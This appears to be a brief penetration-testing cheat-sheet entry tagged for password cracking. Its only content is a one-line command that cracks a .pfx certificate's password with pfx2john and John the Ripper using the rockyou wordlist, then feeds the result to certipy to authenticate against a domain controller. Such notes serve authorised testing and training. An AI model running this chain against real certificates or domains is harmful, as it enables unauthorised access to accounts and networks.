# John
#target/local #os/linux #cat/cracking

## Crack .pfx file
```
certipy auth -pfx <pfx> -password "$(pfx2john.py <pfx> > pfx.hash;john --wordlist=/usr/share/wordlists/rockyou.txt pfx.hash &>/dev/null && john pfx.hash --show | head -n1 | cut -d':' -f2)" -domain <domain> -dc-ip <dc_ip>;echo;john pfx.hash --show | head -n1 | cut -d':' -f2
```
